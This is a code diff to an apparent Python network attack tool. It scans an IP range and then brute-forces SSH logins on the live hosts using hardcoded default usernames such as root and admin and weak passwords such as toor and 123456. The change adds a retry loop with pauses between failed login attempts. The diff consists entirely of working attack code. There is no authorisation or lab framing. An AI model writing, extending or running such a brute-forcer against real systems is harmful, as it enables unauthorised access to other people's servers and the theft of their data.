@@ -36,18 +36,29 @@ def scan_ips(ip_range, port):
 
     return live_ips  
 
-def try_ssh(ip_address, username, password, timeout=0.5, banner_timeout=5):
+def try_ssh(ip_address, username, password, timeout=0.5, banner_timeout=5, max_attempts=3):
     """
-    Attempts an SSH connection with a specified username and password for a given IP address
+    Attempts an SSH connection with a specified username and password for a given IP address.
+    Reconnects to the target after 3 failed attempts.
     """
-    ssh = paramiko.SSHClient()
-    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    success = False
+    attempts = 0
+    while not success and attempts < max_attempts:
+        ssh = paramiko.SSHClient()
+        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        try:
+            ssh.connect(ip_address, username=username, password=password, timeout=timeout, banner_timeout=banner_timeout)
+            success = True
+            return True
+        except:
+            attempts += 1
+            console.print(f"Failed to log in to {ip_address} with username: {username} and password: {password}. Attempt {attempts} of {max_attempts}. Retrying...", style="red")
+            time.sleep(3)
 
-    try:
-        ssh.connect(ip_address, username=username, password=password, timeout=timeout, banner_timeout=banner_timeout)
-        return True
-    except:
-        return False  
+    if attempts >= max_attempts:
+        console.print(f"Reached maximum login attempts for {ip_address}. Reconnecting...", style="yellow")
+
+    return False
 
 def scan_ssh(ip_address):
     """
@@ -55,7 +66,7 @@ def scan_ssh(ip_address):
     to return successful SSH login credentials
     """
     usernames = ['root', 'admin', 'ubuntu','kali']
-    passwords = ['password', 'kali', 'admin', 'toor', 'qwerty'] 
+    passwords = ['password', '123456', 'admin', 'toor', 'qwerty'] 
     for user in usernames:
         for password in passwords:
             if try_ssh(ip_address, user, password):
